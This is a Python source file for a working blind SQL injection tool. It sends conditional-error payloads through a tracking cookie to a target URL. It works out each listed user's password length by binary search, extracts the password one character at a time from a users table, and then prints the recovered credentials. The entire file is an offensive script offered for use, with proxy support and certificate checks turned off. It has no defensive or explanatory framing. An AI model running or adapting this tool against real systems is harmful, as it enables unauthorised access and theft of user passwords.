import sys
import string
import requests
from urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style
from assets.assets_code import setup_logger, log_info, log_warn, log_error

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class BlindSQLiEngine:
    def __init__(self, args):
        self.url = args.url
        self.base_id = args.tracking
        self.cookie_name = args.cookie
        self.target_users = [u.strip() for u in args.users.split(',')]
        self.max_length = args.length
        self.use_special = args.special
        self.workers = 1
        self.timeout = args.timeout
        self.logger, self.log_file_path = setup_logger(args.log)
        
        self.proxies = None
        if args.proxy:
            self.proxies = {
                'http': args.proxy,
                'https': args.proxy
            }
            log_info(f"Proxy enabled: {args.proxy}")

        self.charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
        if self.use_special:
            self.charset += "!@#$%^&*()-_=+[]{}|;:,.<>?/\\~`"
            
        self.session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(max_retries=3)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        
        self.active_mode = 2

    def _build_payload_mode2(self, user, position, char):
        if char is None:
            return f"{self.base_id}' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username='{user}' and LENGTH(password)>1) || '"
        else:
            return f"{self.base_id}' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username='{user}' and substring(password,{position},1)='{char}') || '"

    def _build_length_payload_mode2(self, user, mid):
        return f"{self.base_id}' || (select CASE WHEN (length(password) >= {mid}) THEN TO_CHAR(1/0) ELSE '' END from users where username='{user}') || '"

    def _send_request(self, payload):
        cookies = {self.cookie_name: payload}
        try:
            response = self.session.get(
                self.url,
                cookies=cookies,
                proxies=self.proxies,
                verify=False,
                timeout=self.timeout
            )
            if response.status_code == 500 or "Internal Server Error" in response.text:
                return True
            return False
        except Exception as e:
            self.logger.debug(f"Request failed: {e}")
            return False

    def _detect_length(self, user):
        log_info(f"Detecting password length for '{user}'...")
        max_possible = 128
        low, high = 1, max_possible
        length = -1
        
        while low <= high:
            mid = (low + high) // 2
            payload = self._build_length_payload_mode2(user, mid)
            
            if self._send_request(payload):
                length = mid
                low = mid + 1
            else:
                high = mid - 1

        if length == -1:
            log_error("Could not determine length. User might not exist or no password.")
            return None
            
        log_info(f"Password length detected: {length}")
        return length

    def _extract_char(self, user, position):
        for char in self.charset:
            payload = self._build_payload_mode2(user, position, char)
            if self._send_request(payload):
                return char
        return None

    def extract_password(self, user):
        log_info(f"Starting extraction for user: {Fore.CYAN}{user}{Style.RESET_ALL}")
        
        if self.max_length:
            length = self.max_length
            log_info(f"Using provided length: {length}")
        else:
            length = self._detect_length(user)
            if not length:
                return None

        password = ""
        
        for pos in range(1, length + 1):
            sys.stdout.write(f"\r[+] {user} | Pos {pos}/{length} | Current: {Fore.YELLOW}{password}{Style.RESET_ALL} ")
            sys.stdout.flush()
            
            char = self._extract_char(user, pos)
            
            if char:
                password += char
                self.logger.info(f"Position {pos}: Found '{char}'")
            else:
                log_warn(f"Character not found at position {pos}. Stopping extraction for {user}.")
                break
                
        sys.stdout.write("\n")
        return password

    def run(self):
        results = {}
        
        for user in self.target_users:
            log_info(f"{'='*20} Target: {user} {'='*20}")
            password = self.extract_password(user)
            if password:
                results[user] = password
                log_info(f"Success! Password for {Fore.CYAN}{user}{Style.RESET_ALL} is: {Fore.GREEN}{password}{Style.RESET_ALL}")
            else:
                log_error(f"Failed to extract password for {user}.")

        print(f"\n{Fore.MAGENTA}{'='*40}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA} FINAL RESULTS {Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*40}{Style.RESET_ALL}")
        for user, pwd in results.items():
            print(f"{Fore.CYAN}{user:15} {Style.RESET_ALL} : {Fore.GREEN}{pwd}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*40}{Style.RESET_ALL}")
        print(f"\n[+] Results logged to: {self.log_file_path}")